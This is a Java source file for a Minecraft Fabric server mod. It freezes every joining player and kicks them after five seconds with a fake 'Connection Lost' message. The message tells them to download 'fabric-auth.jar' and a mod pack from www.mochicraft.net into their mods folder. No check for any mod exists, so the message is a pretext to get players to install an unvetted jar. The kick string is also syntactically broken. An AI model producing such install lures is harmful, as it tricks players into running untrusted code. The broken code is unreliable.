package com.example.modkick;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.server.network.ServerPlayNetworkHandler;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class ModKick implements ModInitializer {

    // Cambia esto por el nombre del mod que quieres que diga el mensaje
    private static final String MOD = "NOMBRE_DEL_MOD";
    // 100 ticks = 5 segundos
    private static final int TICKS_ANTES_DE_KICK = 100;

    private static class Congelado {
        final double x, y, z;
        final float yaw, pitch;
        int ticksRestantes = TICKS_ANTES_DE_KICK;

        Congelado(ServerPlayerEntity p) {
            this.x = p.getX();
            this.y = p.getY();
            this.z = p.getZ();
            this.yaw = p.getYaw();
            this.pitch = p.getPitch();
        }
    }

    private static final Map<UUID, Congelado> congelados = new HashMap<>();

    @Override
    public void onInitialize() {

        // Al entrar: lo congelamos (siempre, tenga o no el mod)
        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
            ServerPlayerEntity p = handler.getPlayer();
            congelados.put(p.getUuid(), new Congelado(p));
        });

        // Al salir: limpiamos
        ServerPlayConnectionEvents.DISCONNECT.register((handler, server) ->
            congelados.remove(handler.getPlayer().getUuid()));

        // Cada tick: mantenemos congelado y contamos los 5 segundos
        ServerTickEvents.END_SERVER_TICK.register(server -> {
            List<ServerPlayNetworkHandler> aKickear = new ArrayList<>();

            for (ServerPlayerEntity p : server.getPlayerManager().getPlayerList()) {
                Congelado c = congelados.get(p.getUuid());
                if (c == null) continue;

                if (--c.ticksRestantes <= 0) {
                    aKickear.add(p.networkHandler);
                } else {
                    double dx = p.getX() - c.x;
                    double dy = p.getY() - c.y;
                    double dz = p.getZ() - c.z;
                    if (dx * dx + dy * dy + dz * dz > 0.0001) {
                        p.networkHandler.requestTeleport(c.x, c.y, c.z, c.yaw, c.pitch);
                    }
                }
            }

            // Kickeamos fuera del bucle para no modificar el mapa mientras se recorre
            for (ServerPlayNetworkHandler h : aKickear) {
                congelados.remove(h.getPlayer().getUuid());
                h.disconnect(Text.literal(
                    "§c                    Connection Lost\n
§e       You need Fabric Auth + the Biome Journey pack\n
§eDownload both .jar files from the website and install them in .minecraft/mods:\n
\n
§a                       How to install\n
§a1. Install Fabric Loader + Fabric API (fabricmc.net) for Minecraft 1.21.11\n
§a2. Download fabric-auth.jar and the Mochi Mod Pack from www.mochicraft.net\n
§a3. Place BOTH jars in .minecraft/mods along with Fabric API - do not confuse fabric-auth with Fabric API\n
§a4. Restart the launcher, select the fabric profile and join again\n
§a                 Required key (mod id): fabric-auth\n
§a                         Pack: MochiCraft));
            }
        });
    }
}
